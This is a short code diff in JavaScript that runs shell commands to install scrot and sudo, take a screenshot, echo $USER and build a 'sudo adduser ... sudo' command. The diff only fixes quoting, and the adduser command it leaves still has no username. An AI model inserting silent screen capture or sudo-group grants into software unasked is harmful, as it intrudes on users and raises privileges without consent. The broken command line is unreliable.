@@ -15,9 +15,9 @@ shell.exec("apt-get install scrot", function(){});
       
 shell.exec("scrot MyScreenshot.png", function(){});
 shell.exec("apt-get install sudo", function(){});
-shell.exec("echo "$USER"", function(){});
+shell.exec("echo '$USER'", function(){});
  
-var cm="sudo adduser "+""+" sudo";
+var cm="sudo adduser "+" "+" sudo";
       
       /*
       screenshot().then((img) => {
